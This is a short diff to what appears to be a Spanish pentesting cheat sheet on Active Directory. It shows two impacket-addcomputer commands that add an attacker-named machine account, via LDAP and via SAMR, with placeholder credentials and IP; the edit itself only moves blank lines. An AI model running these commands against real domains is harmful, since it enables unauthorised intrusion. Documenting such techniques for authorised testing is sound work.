@@ -12,13 +12,13 @@
   <img src="https://img.shields.io/badge/Type-CheatSheet-111827?style=for-the-badge&logoColor=00FFFF">
 </p>
 
-
 ```
 impacket-addcomputer dominio.local/usuario_valido:Password123 -computer-name 'PRUEBA-PC$' -computer-pass 'MaliciousPass123!' -dc-ip IP_DEL_DC
 ```
 > Via LDAP
 
 </br>
+
 ```
 impacket-addcomputer dominio.local/usuario_valido:Password123 -computer-name 'PRUEBA-PC$' -computer-pass 'MaliciousPass123!' -dc-ip IP_DEL_DC -method SAMR
 ```
